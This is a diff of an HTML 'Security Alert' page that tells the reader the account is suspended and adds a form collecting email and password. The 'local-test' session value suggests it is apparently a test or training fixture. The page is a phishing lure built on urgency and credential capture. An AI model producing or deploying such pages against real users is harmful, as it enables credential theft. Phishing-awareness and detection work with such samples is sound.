@@ -1,6 +1,7 @@
-<!DOCTYPE html>
-<html>
+<!doctype html>
+<html lang="en">
 <head>
+  <meta charset="utf-8">
   <title>Security Alert</title>
 </head>
 <body>
@@ -8,6 +9,18 @@
   <p>Your account has been suspended due to unusual activity.</p>
   <p>Please verify your account immediately to avoid account closure.</p>
   <p>Enter your password and security code to confirm your identity.</p>
-  <button>Verify Account Now</button>
+
+  <form method="post">
+    <input type="hidden" name="session" value="local-test">
+    <label>
+      Email
+      <input type="email" name="email" placeholder="email@example.com">
+    </label>
+    <label>
+      Password
+      <input type="password" name="password" placeholder="Password">
+    </label>
+    <button type="submit">Verify Account</button>
+  </form>
 </body>
 </html>
